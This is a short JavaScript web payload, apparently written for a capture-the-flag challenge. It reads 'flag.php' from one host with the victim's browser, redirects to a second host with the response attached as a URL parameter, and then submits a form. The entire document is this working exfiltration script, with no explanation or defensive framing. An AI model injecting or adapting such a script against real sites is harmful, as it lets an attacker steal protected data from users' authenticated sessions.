var xhr = new XMLHttpRequest(); 

xhr.open('GET', 'https://router.vip/flag.php', false); 
xhr.send(); 
if (xhr.status == 200) { 
  location='https://12345609861router.vip/1234/?result='+xhr.responseText; 
}

document.getElementById("send").submit();

